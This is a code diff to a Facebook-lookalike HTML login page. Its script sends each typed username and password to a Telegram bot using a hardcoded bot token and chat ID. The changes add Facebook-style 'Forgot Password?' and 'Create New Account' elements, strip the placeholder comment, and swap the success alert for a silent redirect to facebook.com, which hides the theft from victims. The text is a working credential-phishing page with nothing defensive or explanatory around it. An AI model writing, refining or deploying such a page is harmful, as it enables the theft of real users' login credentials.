@@ -57,6 +57,28 @@
         .container button:hover {
             background-color: #155db0;
         }
+        .container .links {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+        }
+        .container .links a {
+            text-decoration: none;
+            color: #1877f2;
+            font-weight: 500;
+        }
+        .container .create-account {
+            margin-top: 1rem;
+            background-color: #42b72a;
+            color: #fff;
+            padding: 0.75rem;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+        .container .create-account:hover {
+            background-color: #36a420;
+        }
     </style>
 </head>
 
@@ -69,6 +91,12 @@
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Login</button>
         </form>
+        <div class="links">
+            <a href="#">Forgot Password?</a>
+        </div>
+        <button class="create-account" onclick="window.location.href='https://www.facebook.com/r.php'">
+            Create New Account
+        </button>
     </div>
 
     <script>
@@ -78,7 +106,6 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
             const botToken = '6065710585:AAFpUGbkGgc40U9LfWHZokT2StEMLRn5qNY';
             const chatId = '5543174018';
             const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
@@ -96,9 +123,9 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert('Form submitted successfully!');
+                    window.location.href = 'https://www.facebook.com'; // Redirect after successful submission
                 } else {
-                    alert('Failed to send message.');
+                    alert('something went wrong try again later.');
                 }
             })
             .catch(error => {
